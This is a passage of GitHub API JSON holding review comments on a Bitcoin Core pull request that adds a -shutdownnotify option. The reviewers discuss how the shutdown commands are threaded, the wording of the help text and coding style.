         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r742214334"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742214334"
         }
      },
      "author_association" : "MEMBER",
      "body" : "Needs updating",
      "commit_id" : "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
      "created_at" : "2021-11-03T18:16:13Z",
      "diff_hunk" : "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The shutdownnotify option is used to specify a command to execute when Bitcoin\n+Core has finished with its shutdown sequence. (#23395)",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r742214334",
      "id" : 742214334,
      "line" : 87,
      "node_id" : "PRRC_kwDOABII584sPUq-",
      "original_commit_id" : "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
      "original_line" : 87,
      "original_position" : 5,
      "original_start_line" : null,
      "path" : "doc/release-notes.md",
      "position" : 5,
      "pull_request_review_id" : 796936198,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742214334/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-03T18:19:14Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742214334",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/1095675?v=4",
         "events_url" : "https://api.github.com/users/luke-jr/events{/privacy}",
         "followers_url" : "https://api.github.com/users/luke-jr/followers",
         "following_url" : "https://api.github.com/users/luke-jr/following{/other_user}",
         "gists_url" : "https://api.github.com/users/luke-jr/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/luke-jr",
         "id" : 1095675,
         "login" : "luke-jr",
         "node_id" : "MDQ6VXNlcjEwOTU2NzU=",
         "organizations_url" : "https://api.github.com/users/luke-jr/orgs",
         "received_events_url" : "https://api.github.com/users/luke-jr/received_events",
         "repos_url" : "https://api.github.com/users/luke-jr/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/luke-jr/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/luke-jr/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/luke-jr"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r742215098"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742215098"
         }
      },
      "author_association" : "MEMBER",
      "body" : "Probably should start all the commands, *then* wait on them. (If a user wants a sequence of commands to run synchronously, he can just specify them as a single `-shutdownnotify` or use a shell script.)",
      "commit_id" : "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
      "created_at" : "2021-11-03T18:17:15Z",
      "diff_hunk" : "@@ -174,13 +174,25 @@ void Interrupt(NodeContext& node)\n     }\n }\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        std::thread t(runCommand, cmd);\n+        t.join(); // thread runs free",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r742215098",
      "id" : 742215098,
      "line" : 182,
      "node_id" : "PRRC_kwDOABII584sPU26",
      "original_commit_id" : "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
      "original_line" : 182,
      "original_position" : 9,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : 9,
      "pull_request_review_id" : 796936198,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742215098/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-03T18:19:14Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742215098",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/1095675?v=4",
         "events_url" : "https://api.github.com/users/luke-jr/events{/privacy}",
         "followers_url" : "https://api.github.com/users/luke-jr/followers",
         "following_url" : "https://api.github.com/users/luke-jr/following{/other_user}",
         "gists_url" : "https://api.github.com/users/luke-jr/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/luke-jr",
         "id" : 1095675,
         "login" : "luke-jr",
         "node_id" : "MDQ6VXNlcjEwOTU2NzU=",
         "organizations_url" : "https://api.github.com/users/luke-jr/orgs",
         "received_events_url" : "https://api.github.com/users/luke-jr/received_events",
         "repos_url" : "https://api.github.com/users/luke-jr/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/luke-jr/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/luke-jr/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/luke-jr"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r742216204"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742216204"
         }
      },
      "author_association" : "MEMBER",
      "body" : "```suggestion\r\n    argsman.AddArg(\"-shutdownnotify=<cmd>\", \"Execute command immediately before beginning shutdown. The need for shutdown may be urgent, so be careful not to delay it long (if the command doesn't require interaction with the server, consider having it fork into the background).\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\r\n```\r\n\r\nOr maybe something shorter?",
      "commit_id" : "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
      "created_at" : "2021-11-03T18:18:46Z",
      "diff_hunk" : "@@ -405,6 +417,7 @@ void SetupServerArgs(ArgsManager& argsman)\n     argsman.AddArg(\"-settings=<file>\", strprintf(\"Specify path to dynamic settings data file. Can be disabled with -nosettings. File is written at runtime and not meant to be edited by users (use %s instead for custom settings). Relative paths will be prefixed by datadir location. (default: %s)\", BITCOIN_CONF_FILENAME, BITCOIN_SETTINGS_FILENAME), ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\n #if HAVE_SYSTEM\n     argsman.AddArg(\"-startupnotify=<cmd>\", \"Execute command on startup.\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\n+    argsman.AddArg(\"-shutdownnotify=<cmd>\", \"Execute command on shutdown.\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r742216204",
      "id" : 742216204,
      "line" : 420,
      "node_id" : "PRRC_kwDOABII584sPVIM",
      "original_commit_id" : "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
      "original_line" : 420,
      "original_position" : 30,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : 30,
      "pull_request_review_id" : 796936198,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742216204/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-03T18:19:14Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742216204",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/1095675?v=4",
         "events_url" : "https://api.github.com/users/luke-jr/events{/privacy}",
         "followers_url" : "https://api.github.com/users/luke-jr/followers",
         "following_url" : "https://api.github.com/users/luke-jr/following{/other_user}",
         "gists_url" : "https://api.github.com/users/luke-jr/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/luke-jr",
         "id" : 1095675,
         "login" : "luke-jr",
         "node_id" : "MDQ6VXNlcjEwOTU2NzU=",
         "organizations_url" : "https://api.github.com/users/luke-jr/orgs",
         "received_events_url" : "https://api.github.com/users/luke-jr/received_events",
         "repos_url" : "https://api.github.com/users/luke-jr/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/luke-jr/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/luke-jr/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/luke-jr"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744108916"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744108916"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "Done ðð» ",
      "commit_id" : "2d8a11b9ad4ac224357f21077ed023203b2d98cd",
      "created_at" : "2021-11-06T10:21:34Z",
      "diff_hunk" : "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The shutdownnotify option is used to specify a command to execute when Bitcoin\n+Core has finished with its shutdown sequence. (#23395)",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744108916",
      "id" : 744108916,
      "in_reply_to_id" : 742214334,
      "line" : null,
      "node_id" : "PRRC_kwDOABII584sWjN0",
      "original_commit_id" : "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
      "original_line" : 87,
      "original_position" : 5,
      "original_start_line" : null,
      "path" : "doc/release-notes.md",
      "position" : null,
      "pull_request_review_id" : 799433960,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744108916/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-06T10:21:35Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744108916",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744109218"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744109218"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "Agreed, updated to start all commands then join on all of them afterward",
      "commit_id" : "2d8a11b9ad4ac224357f21077ed023203b2d98cd",
      "created_at" : "2021-11-06T10:23:56Z",
      "diff_hunk" : "@@ -174,13 +174,25 @@ void Interrupt(NodeContext& node)\n     }\n }\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        std::thread t(runCommand, cmd);\n+        t.join(); // thread runs free",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744109218",
      "id" : 744109218,
      "in_reply_to_id" : 742215098,
      "line" : null,
      "node_id" : "PRRC_kwDOABII584sWjSi",
      "original_commit_id" : "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
      "original_line" : 182,
      "original_position" : 9,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : null,
      "pull_request_review_id" : 799434141,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744109218/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-06T10:24:07Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744109218",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744109434"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744109434"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "Thanks! Updated to use your wording instead ðð» ",
      "commit_id" : "2d8a11b9ad4ac224357f21077ed023203b2d98cd",
      "created_at" : "2021-11-06T10:26:39Z",
      "diff_hunk" : "@@ -405,6 +417,7 @@ void SetupServerArgs(ArgsManager& argsman)\n     argsman.AddArg(\"-settings=<file>\", strprintf(\"Specify path to dynamic settings data file. Can be disabled with -nosettings. File is written at runtime and not meant to be edited by users (use %s instead for custom settings). Relative paths will be prefixed by datadir location. (default: %s)\", BITCOIN_CONF_FILENAME, BITCOIN_SETTINGS_FILENAME), ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\n #if HAVE_SYSTEM\n     argsman.AddArg(\"-startupnotify=<cmd>\", \"Execute command on startup.\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);\n+    argsman.AddArg(\"-shutdownnotify=<cmd>\", \"Execute command on shutdown.\", ArgsManager::ALLOW_ANY, OptionsCategory::OPTIONS);",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744109434",
      "id" : 744109434,
      "in_reply_to_id" : 742216204,
      "line" : null,
      "node_id" : "PRRC_kwDOABII584sWjV6",
      "original_commit_id" : "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
      "original_line" : 420,
      "original_position" : 30,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : null,
      "pull_request_review_id" : 799434285,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744109434/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-06T10:26:39Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744109434",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "Concept ACK",
      "created_at" : "2021-11-07T02:59:36Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-962543678",
      "id" : 962543678,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845X0A-",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/962543678/reactions"
      },
      "updated_at" : "2021-11-07T02:59:36Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/962543678",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/91535?v=4",
         "events_url" : "https://api.github.com/users/theStack/events{/privacy}",
         "followers_url" : "https://api.github.com/users/theStack/followers",
         "following_url" : "https://api.github.com/users/theStack/following{/other_user}",
         "gists_url" : "https://api.github.com/users/theStack/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/theStack",
         "id" : 91535,
         "login" : "theStack",
         "node_id" : "MDQ6VXNlcjkxNTM1",
         "organizations_url" : "https://api.github.com/users/theStack/orgs",
         "received_events_url" : "https://api.github.com/users/theStack/received_events",
         "repos_url" : "https://api.github.com/users/theStack/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/theStack/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/theStack/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/theStack"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744293568"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744293568"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "nit: put in braces to match our coding guidelines (or alternatively, all on a single line)\r\n```suggestion\r\n    for (auto& t : threads) {\r\n        t.join();\r\n    }\r\n```",
      "commit_id" : "2d8a11b9ad4ac224357f21077ed023203b2d98cd",
      "created_at" : "2021-11-07T17:55:08Z",
      "diff_hunk" : "@@ -174,13 +174,27 @@ void Interrupt(NodeContext& node)\n     }\n }\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);\n+    }\n+    for (auto& t : threads)\n+        t.join();",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744293568",
      "id" : 744293568,
      "line" : 185,
      "node_id" : "PRRC_kwDOABII584sXQTA",
      "original_commit_id" : "9de9d4a5fe15c44de25f1dba4b5318fd1d66b99f",
      "original_line" : 185,
      "original_position" : 12,
      "original_start_line" : 184,
      "path" : "src/init.cpp",
      "position" : 12,
      "pull_request_review_id" : 799568018,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744293568/reactions"
      },
      "side" : "RIGHT",
      "start_line" : 184,
      "start_side" : "RIGHT",
      "updated_at" : "2021-11-07T18:15:14Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744293568",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/91535?v=4",
         "events_url" : "https://api.github.com/users/theStack/events{/privacy}",
         "followers_url" : "https://api.github.com/users/theStack/followers",
         "following_url" : "https://api.github.com/users/theStack/following{/other_user}",
         "gists_url" : "https://api.github.com/users/theStack/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/theStack",
         "id" : 91535,
         "login" : "theStack",
         "node_id" : "MDQ6VXNlcjkxNTM1",
         "organizations_url" : "https://api.github.com/users/theStack/orgs",
         "received_events_url" : "https://api.github.com/users/theStack/received_events",
         "repos_url" : "https://api.github.com/users/theStack/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/theStack/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/theStack/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/theStack"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744295494"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744295494"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "```suggestion\r\n- The `shutdownnotify` option is used to specify a command to execute synchronously\r\n  before Bitcoin Core begins its shutdown sequence. (#23395)\r\n```",
      "commit_id" : "2d8a11b9ad4ac224357f21077ed023203b2d98cd",
      "created_at" : "2021-11-07T18:11:10Z",
      "diff_hunk" : "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The shutdownnotify option is used to specify a command to execute synchronously\n+when Bitcoin Core has begins its shutdown sequence. (#23395)",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744295494",
      "id" : 744295494,
      "line" : 87,
      "node_id" : "PRRC_kwDOABII584sXQxG",
      "original_commit_id" : "2d8a11b9ad4ac224357f21077ed023203b2d98cd",
      "original_line" : 87,
      "original_position" : 5,
      "original_start_line" : 86,
      "path" : "doc/release-notes.md",
      "position" : 5,
      "pull_request_review_id" : 799568018,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744295494/reactions"
      },
      "side" : "RIGHT",
      "start_line" : 86,
      "start_side" : "RIGHT",
      "updated_at" : "2021-11-07T18:15:14Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744295494",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/91535?v=4",
         "events_url" : "https://api.github.com/users/theStack/events{/privacy}",
         "followers_url" : "https://api.github.com/users/theStack/followers",
         "following_url" : "https://api.github.com/users/theStack/following{/other_user}",
         "gists_url" : "https://api.github.com/users/theStack/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/theStack",
         "id" : 91535,
         "login" : "theStack",
         "node_id" : "MDQ6VXNlcjkxNTM1",
         "organizations_url" : "https://api.github.com/users/theStack/orgs",
         "received_events_url" : "https://api.github.com/users/theStack/received_events",
         "repos_url" : "https://api.github.com/users/theStack/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/theStack/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/theStack/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/theStack"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744338502"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744338502"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "Done ðð» ",
      "commit_id" : "1f4382da3cfa8f494573833a668203023aeb1753",
      "created_at" : "2021-11-08T00:03:51Z",
      "diff_hunk" : "@@ -174,13 +174,27 @@ void Interrupt(NodeContext& node)\n     }\n }\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);\n+    }\n+    for (auto& t : threads)\n+        t.join();",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744338502",
      "id" : 744338502,
      "in_reply_to_id" : 744293568,
      "line" : null,
      "node_id" : "PRRC_kwDOABII584sXbRG",
      "original_commit_id" : "9de9d4a5fe15c44de25f1dba4b5318fd1d66b99f",
      "original_line" : 185,
      "original_position" : 12,
      "original_start_line" : 184,
      "path" : "src/init.cpp",
      "position" : null,
      "pull_request_review_id" : 799604209,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744338502/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : "RIGHT",
      "updated_at" : "2021-11-08T00:03:51Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744338502",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744338532"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744338532"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "Done ðð» ",
      "commit_id" : "1f4382da3cfa8f494573833a668203023aeb1753",
      "created_at" : "2021-11-08T00:04:03Z",
      "diff_hunk" : "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The shutdownnotify option is used to specify a command to execute synchronously\n+when Bitcoin Core has begins its shutdown sequence. (#23395)",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r744338532",
      "id" : 744338532,
      "in_reply_to_id" : 744295494,
      "line" : null,
      "node_id" : "PRRC_kwDOABII584sXbRk",
      "original_commit_id" : "2d8a11b9ad4ac224357f21077ed023203b2d98cd",
      "original_line" : 87,
      "original_position" : 5,
      "original_start_line" : 86,
      "path" : "doc/release-notes.md",
      "position" : null,
      "pull_request_review_id" : 799604238,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
